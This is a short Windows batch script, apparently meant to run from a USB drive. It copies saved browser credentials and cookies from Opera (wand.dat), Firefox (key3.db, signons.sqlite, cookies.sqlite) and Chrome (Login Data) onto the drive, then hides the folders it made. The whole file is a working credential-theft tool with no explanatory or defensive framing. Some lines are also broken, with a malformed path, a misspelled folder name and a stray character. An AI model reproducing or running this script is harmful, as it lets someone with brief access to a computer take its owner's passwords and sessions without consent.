@echo off
md %~d0\Mozilla
md %~d0\Opera
md %~d0\Google
CD/D %APPDATA%\Opera\Opera\
copy /y wand.dat %~d0\Opera\
copy /y cookies.dat %~d0\Opera\
cd %AppData%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite %~d0\Mozilla
copy /y key3.db %~d0\Mozilla
copy /y signons.sqlite %~d0\Mozilla
copy /y AppData%\Mozilla\Firefox\Profiles\*.default %~d0\Mozilla
cd %localappdata%\Google\Chrome\User Data\Default
copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"
ATTRIB -R -A -S -H
attrib +h %~d0\Mozilla
attrib +h %~d0\Opeara
attrib +h %~d0\Google?